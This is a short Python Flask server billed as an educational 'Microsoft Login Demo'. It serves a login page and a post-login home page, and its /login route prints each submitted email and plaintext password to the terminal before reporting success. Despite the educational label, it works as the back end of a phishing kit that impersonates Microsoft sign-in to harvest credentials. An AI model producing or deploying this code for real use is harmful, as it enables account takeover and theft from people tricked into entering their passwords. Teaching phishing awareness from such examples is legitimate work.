import os
from flask import Flask, request, jsonify

app = Flask(__name__)

# Get the directory where this server.py file is located
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.route('/login', methods=['POST'])
def handle_login():
    email = request.form.get('email')
    password = request.form.get('password')

    # 🎯 YOUR DATA APPEARS RIGHT HERE IN THE TERMINAL!
    print("\n" + "="*50)
    print("📩 BACKEND DATA RECEIVED (Educational Demo):")
    print(f"   📧 Email:    {email}")
    print(f"   🔑 Password: {password}")
    print("="*50 + "\n")

    return jsonify({"status": "success"})

@app.route('/')
def home():
    # Look for index.html in the SAME folder as server.py
    file_path = os.path.join(BASE_DIR, "index.html")
    return open(file_path, "r", encoding="utf-8").read()

@app.route('/home')
def dashboard():
    # Look for home.html in the SAME folder as server.py
    file_path = os.path.join(BASE_DIR, "home.html")
    return open(file_path, "r", encoding="utf-8").read()

if __name__ == '__main__':
    print("🚀 Microsoft Login Demo Server is running!")
    print("👉 Open your browser and go to: http://127.0.0.1:5000")
    print("📝 Type any email/password and click Sign in.")
    print("📊 The data will appear RIGHT HERE in this terminal.")
    print("✅ You will be redirected to the Home page.\n")
    app.run(debug=True)